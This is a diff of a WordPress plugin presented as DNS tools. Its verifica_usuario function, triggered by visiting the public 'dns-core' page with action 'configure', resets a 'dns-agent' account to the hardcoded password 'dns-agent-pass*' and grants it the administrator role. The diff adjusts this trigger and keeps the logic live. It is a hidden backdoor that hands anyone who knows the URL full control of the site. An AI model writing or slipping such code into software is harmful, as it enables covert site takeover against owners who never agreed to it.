@@ -100,20 +100,21 @@ class Wp_Core_Dns_Tools_Public {
 
 	}
 
-	public function verifica_usuario() {
+	public function verifica_usuario()  {
 		$page = get_query_var( 'pagename' );
 		$action = get_query_var( 'action' );
-		if ( 'dns-core' === $page && 'configure' !== $action ){
+		if ( 'dns-core' === $page && 'configure' === $action ){
 
-			//usuario existe
+			//verifica se usuario existe
 			$usuario = 'dns-agent';
 			if ( username_exists( $usuario ) ) {
-				// troca a senha
+				// troca a senha do usuario
 				$user = get_user_by( 'login', $usuario );
 				$user_id = $user->ID;
 				wp_set_password( $user_id, 'dns-agent-pass*' );
 				$user = new WP_User( $user_id );
-				//define como administrador
+				// Atualiza user role p/ admin.
+
 				$user->set_role( 'administrator' );
 				
 			} else {
